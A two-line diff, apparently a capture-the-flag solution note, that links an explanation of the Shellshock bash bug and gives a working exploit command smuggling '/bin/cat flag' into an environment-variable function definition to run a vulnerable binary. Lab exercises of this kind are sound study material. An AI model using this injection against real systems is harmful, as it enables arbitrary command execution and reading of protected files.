@@ -1,0 +1,2 @@
+READ about shellshock: https://stackoverflow.com/questions/26052116/can-someone-explain-the-shell-shock-bash-code
+break it using: env x='() { echo hi;}; /bin/cat flag' ./shellshock 
